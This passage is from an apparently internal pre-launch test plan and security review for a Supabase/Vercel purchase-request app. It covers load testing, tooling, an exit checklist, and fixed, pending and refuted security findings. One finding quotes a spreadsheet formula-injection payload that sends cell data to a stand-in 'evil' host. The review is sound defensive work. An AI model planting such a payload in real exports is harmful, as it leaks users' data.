5. **Cold starts and `after()` background work.** Notification sends (Slack) run in `after()`, which extends the serverless function's billed/execution duration after the HTTP response is already sent — it does not delay the user. Confirm empirically that a slow or failing Slack call never causes a *user-visible* delay, only a possibly-truncated background task if it runs past the function's max duration.

**Bottom line:** skip a dedicated k6/Locust load-testing phase for launch — it would validate a scenario far below this stack's headroom. Spend that effort instead on the concurrency correctness tests in 8.3 and a single burst-tolerance smoke test (item 1 above) against a staging environment.

## 10. Tooling recommendation

No test framework is currently installed. Recommended minimal set:

- **Vitest** for pure-function unit tests (`lib/payment.ts`'s `expectedPaymentDate`/`allowedDocTypes`, `lib/http.ts`'s origin checks, filename sanitization) — fast, zero-config with this stack.
- **A plain Node/TS script (or pgTAP if comfortable with SQL)** against a disposable Supabase branch for the RPC test layer in Section 7.1 — this is where the highest-value tests live, since the RPCs are the actual business logic.
- **Playwright** for the end-to-end lifecycle tests in Section 7.3 — handles OAuth redirects, file uploads, and native dialogs with its dialog-handling API.
- **CI**: run Vitest + RPC tests on every push; run Playwright against a preview deployment before merging to `main`, given Vercel preview deployments are already the natural fit here.

## 11. Pre-launch exit checklist

- [ ] Every P0 finding in Section 5 is either fixed or has an explicit, written accept-the-risk decision from Gabriel/Finance.
- [ ] Section 8's P0 test cases all pass against a staging environment that mirrors production (same Supabase project or a faithful branch, real Google OAuth restricted to `@vammo.com`).
- [ ] The burst-tolerance smoke test (Section 9, item 1) has been run at least once against staging.
- [ ] `security-review` skill has been run against the current `main` diff.
- [ ] Slack one-click approval is either fully wired to real per-user routing, or explicitly disabled/hidden from the UI for launch (do not ship the hardcoded-test-user version silently).
- [ ] A rollback plan exists for the Supabase migration state (this schema is shared with other apps in the same project — confirm nothing here can be rolled back in a way that affects them).

## 12. Security & data-leak review (2026-07-01)

Method: a 5-dimension fan-out review (authorization/RLS, storage/documents, auth/CSRF/secrets, injection/client-data, and this session's diff), with every finding adversarially verified by a second agent instructed to refute it. 16 agents, 11 raw findings → 4 survived verification. Two of those were then fixed, one downgraded to a recommendation, and one contested finding was resolved by a direct empirical test against the live database.

### Fixed in this pass

1. **CSV export formula injection (medium).** `exportCSV()` in [finance-dashboard.tsx](components/finance-dashboard.tsx) quoted values for delimiter safety but did not neutralize spreadsheet formula prefixes. A supplier name like `=HYPERLINK("https://evil/?"&C2,"x")` (which passes the server's trim/length-only validation) would execute when a finance user opened the CSV in Excel/Sheets/Calc, enabling data exfiltration. Fixed: `esc()` now prefixes a single quote to any value starting with `= + - @` or a leading tab/CR.
2. **Admin routes missing the CSRF origin check (low, defense-in-depth).** The privilege-granting routes (`roles`, `heads`, `cleanup`, `import`) did not call `isSameOrigin`, unlike every other mutating route. Not turnkey-exploitable today (SameSite=Lax + JSON body + the auth gate all block the practical vectors), but an inconsistency on exactly the most sensitive endpoints. Fixed: added `isSameOrigin` to all four.

### Recommended, not yet done

3. **Upload MIME allowlist trusts the client Content-Type (low).** [documents/route.ts](app/api/documents/route.ts) keys its allowlist on `file.type` and the filename extension, with no magic-byte sniffing. Practical risk is low — RLS + the private bucket + 60-second signed URLs gate access, and the allowlist already excludes `text/html`/`image/svg+xml` so inline-render XSS is closed. Recommended hardening: verify leading magic bytes against the claimed MIME before upload, and optionally set `Content-Disposition: attachment` on downloads (note: forcing attachment would remove the inline PDF preview finance relies on, so weigh the UX cost).

### Investigated — false positive (no action)

- **`request_allocations` RLS "leak".** One reviewer flagged that the `request_allocations_select` policy only checks `EXISTS (SELECT 1 FROM purchase_requests WHERE id = request_id)` rather than `can_view_request()`, and claimed any user could read any request's cost-center split. **Empirically refuted against the live DB:** simulating an unauthorized `authenticated` user (`SET ROLE authenticated` + attacker JWT claims) querying a *known* request id that has 3 allocations returned **0** rows — Postgres applies `purchase_requests`' own RLS transitively inside the policy's subquery, so allocation visibility already follows the requester/head/finance rule. No change made. (Tightening the policy to `can_view_request()` for readability-of-intent is optional; it changes no behavior.)

### Latent hardening backlog (refuted as exploitable, worth doing eventually)

- `approve_purchase_request`/`reject_purchase_request`/`is_head_of` don't filter `cost_centers.active`, while `getSessionContext` does — a former head of a since-deactivated CC could act via direct RPC. Not exploitable today: no code path deactivates a cost center, and `submit_purchase_request` blocks inactive CCs at creation. Add an `active` check if a deactivation feature is ever introduced.
- `submit_purchase_request` allows duplicate `cost_center_id` rows in an allocation payload that sum to 100%; they collapse to one row via `ON CONFLICT ... DO UPDATE`. Cosmetic input-hygiene only (correct head is still notified); a distinct-CC guard would be tidier.
